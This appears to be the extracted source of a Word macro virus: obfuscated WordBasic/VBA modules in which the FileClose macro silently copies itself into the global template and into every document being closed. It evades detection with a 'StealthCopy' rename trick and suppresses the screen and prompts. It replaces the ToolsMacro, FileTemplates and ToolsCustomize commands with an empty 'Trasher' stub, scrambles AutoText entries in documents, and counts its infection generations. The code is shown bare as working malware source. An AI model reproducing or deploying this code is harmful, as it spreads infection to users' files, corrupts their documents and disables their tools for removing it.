   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Generation"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "6"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Generation.MAIN"

   End Sub

   Attribute VB_Name = "FileClose"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Closes all of the windows of the active document"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileClose.MAIN"
   Dim qujpsfryvpgmcnovpjsn$
   Dim ogkljqtenikqnsvgbytu$
   Dim bnnwqkpgjalmjxhtamdi$
   Dim EnvCheck
   Dim AutoCount
   Dim caameqhreckgoavnfhuq$
   Dim tlntvgmifclxonptvpfu$
   Dim Count_
   Dim Num
   Dim qvwlhovcjualufyjvhuu$
   Dim Text_$
   Dim fejgtqfixicupwfyawfl$
   Dim Number
   Dim xhinvysxlujookksuuge$

   ' "There's very little meat in these gymmats"
   '                             - Guy Incognito
   '                                     Bedford
   '                                        UK

   On Error Resume Next

   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   WordBasic.DisableInput 1
   WordBasic.ScreenUpdating 0
     qujpsfryvpgmcnovpjsn$ = WordBasic.[SelectionFileName$]()
     ogkljqtenikqnsvgbytu$ = WordBasic.[MacroFileName$]()
     bnnwqkpgjalmjxhtamdi$ = WordBasic.[AppInfo$](1)
   EnvCheck = InStr(bnnwqkpgjalmjxhtamdi$, "Windows")

   If WordBasic.[FileNameInfo$](qujpsfryvpgmcnovpjsn$, 3) = "" Then GoTo NoName
   If qujpsfryvpgmcnovpjsn$ = ogkljqtenikqnsvgbytu$ Then GoTo InfectGlobal

   WordBasic.WaitCursor 1

   If EnvCheck <> 0 Then
   WordBasic.Call "EchoOff.Main", 1
   End If

   WordBasic.MacroCopy "CopyMacro", "Closing"
   WordBasic.ToolsMacro Name:="Closing", Show:=1, Edit:=1

   WordBasic.EditFind Find:="StealthCopy ", WholeWord:=1, Direction:=0, MatchCase:=0, SoundsLike:=0, PatternMatch:=0, Format:=0, Wrap:=0

   While WordBasic.EditFindFound()
   WordBasic.WW6_EditClear
   WordBasic.Insert "MacroCopy "
   WordBasic.EditFind Find:="StealthCopy ", WholeWord:=1, Direction:=0, MatchCase:=0, SoundsLike:=0, PatternMatch:=0, Format:=0, Wrap:=0
   Wend

   WordBasic.DocClose 1
   WordBasic.Call "Closing.CopyToDoc", qujpsfryvpgmcnovpjsn$
   WordBasic.ToolsMacro Name:="Closing", Delete:=1, Show:=1

   WordBasic.FileSaveAs Name:=qujpsfryvpgmcnovpjsn$, Format:=1

   For AutoCount = 1 To WordBasic.CountAutoTextEntries(0)
     caameqhreckgoavnfhuq$ = WordBasic.[AutoTextName$](AutoCount, 0)
   WordBasic.Organizer Copy:=1, Source:=ogkljqtenikqnsvgbytu$, Destination:=qujpsfryvpgmcnovpjsn$, Name:=caameqhreckgoavnfhuq$, Tab:=1
   Next AutoCount

   If EnvCheck <> 0 Then
   WordBasic.Call "EchoOff.Main", 0
   End If

   WordBasic.FileClose 1
   GoTo Exit_

   InfectGlobal:

   WordBasic.WaitCursor 1

   If EnvCheck <> 0 Then
   WordBasic.Call "EchoOff.Main", 1
   End If

   WordBasic.MacroCopy qujpsfryvpgmcnovpjsn$ + ":CopyMacro", qujpsfryvpgmcnovpjsn$ + ":Closing"
   WordBasic.ToolsMacro Name:="Closing", Show:=3, Edit:=1

   WordBasic.EditFind Find:="StealthCopy ", WholeWord:=1, Direction:=0, MatchCase:=0, SoundsLike:=0, PatternMatch:=0, Format:=0, Wrap:=0

   While WordBasic.EditFindFound()
   WordBasic.WW6_EditClear
   WordBasic.Insert "MacroCopy "
   WordBasic.EditFind Find:="StealthCopy ", WholeWord:=1, Direction:=0, MatchCase:=0, SoundsLike:=0, PatternMatch:=0, Format:=0, Wrap:=0
   Wend

   WordBasic.DocClose 1

   WordBasic.MacroCopy qujpsfryvpgmcnovpjsn$ + ":FileClose", qujpsfryvpgmcnovpjsn$ + ":Saving"
   WordBasic.ToolsMacro Name:="Saving", Show:=3, Edit:=1

   For AutoCount = 1 To WordBasic.CountAutoTextEntries(1)

     tlntvgmifclxonptvpfu$ = ""
   For Count_ = 1 To 20
       Num = WordBasic.Int(Rnd() * (122 - 97) + 97)
         qvwlhovcjualufyjvhuu$ = Chr(Num)
         tlntvgmifclxonptvpfu$ = tlntvgmifclxonptvpfu$ + qvwlhovcjualufyjvhuu$
   Next Count_

     tlntvgmifclxonptvpfu$ = tlntvgmifclxonptvpfu$ + "$"
     caameqhreckgoavnfhuq$ = WordBasic.[AutoTextName$](AutoCount, 1)
   Text_$ = WordBasic.[GetAutoText$](caameqhreckgoavnfhuq$, 1)

   WordBasic.StartOfDocument
   WordBasic.EditFind Find:=Text_$, WholeWord:=0, Direction:=0, MatchCase:=0, SoundsLike:=0, PatternMatch:=0, Format:=0, Wrap:=0

   While WordBasic.EditFindFound()
   WordBasic.WW6_EditClear
   WordBasic.Insert " " + tlntvgmifclxonptvpfu$
   WordBasic.EditFind Find:=Text_$, WholeWord:=0, Direction:=0, MatchCase:=0, SoundsLike:=0, PatternMatch:=0, Format:=0, Wrap:=0
   Wend

   WordBasic.SetAutoText caameqhreckgoavnfhuq$, tlntvgmifclxonptvpfu$, 0

   Next AutoCount

   WordBasic.DocClose 1

   WordBasic.Call "Closing.CopyToGlobal", qujpsfryvpgmcnovpjsn$
   WordBasic.ToolsMacro Name:="Closing", Delete:=1, Show:=3
   WordBasic.ToolsMacro Name:="Saving", Delete:=1, Show:=3

     fejgtqfixicupwfyawfl$ = WordBasic.[MacroDesc$]("Generation")
   If Len(fejgtqfixicupwfyawfl$) > 14 Then fejgtqfixicupwfyawfl$ = "0"
   Number = WordBasic.Val(fejgtqfixicupwfyawfl$) + 1
     xhinvysxlujookksuuge$ = Str(Number)
     fejgtqfixicupwfyawfl$ = WordBasic.[LTrim$](xhinvysxlujookksuuge$)
   WordBasic.ToolsMacro Name:="Generation", Description:=fejgtqfixicupwfyawfl$, Show:=1, SetDesc:=1

   If EnvCheck <> 0 Then
   WordBasic.Call "EchoOff.Main", 0
   End If

   NoName:
   WordBasic.FileClose

   Exit_:

   End Sub

   Attribute VB_Name = "CopyMacro"

   Private Sub CopyToDoc(DestFile$)
   Dim StealthCopy

   On Error Resume Next

   StealthCopy "FileClose", DestFile$ + ":FileClose"
   StealthCopy "Generation", DestFile$ + ":Generation"
   StealthCopy "ToolsMacro", DestFile$ + ":Trasher"
   StealthCopy "CopyMacro", DestFile$ + ":CopyMacro"
   StealthCopy "EchoOff", DestFile$ + ":EchoOff"

   End Sub

   Private Sub CopyToGlobal(DestFile$)
   Dim StealthCopy

   On Error Resume Next

   StealthCopy DestFile$ + ":Saving", "FileClose"
   StealthCopy DestFile$ + ":Generation", "Generation"
   StealthCopy DestFile$ + ":Trasher", "ToolsMacro"
   StealthCopy DestFile$ + ":Trasher", "FileTemplates"
   StealthCopy DestFile$ + ":Trasher", "ToolsCustomize"
   StealthCopy DestFile$ + ":CopyMacro", "CopyMacro"
   StealthCopy DestFile$ + ":EchoOff", "EchoOff"

   End Sub

   Attribute VB_Name = "Trasher"

   Public Sub MAIN()

   End Sub

   Attribute VB_Name = "EchoOff"

   REM : Word ne gère pas les fonctions externes des bibliothèques 16 bits.
   REM : la déclaration a été transformée en commentaire pour éviter de provoquer une erreur.
   Rem Private Declare Function LockWindowUpdate Lib "USER.EXE"(ByVal hWnd As Integer) As Integer
   REM : Word ne gère pas les fonctions externes des bibliothèques 16 bits.
   REM : la déclaration a été transformée en commentaire pour éviter de provoquer une erreur.
   Rem Private Declare Function GetActiveWindow Lib "USER.EXE"() As Integer

   Public Sub MAIN(Number)
   Dim hWnd
   Dim Success

   If Number = 1 Then

   hWnd = GetActiveWindow
   Success = LockWindowUpdate(hWnd)

   Else

   Success = LockWindowUpdate(0)

   End If

   End Sub
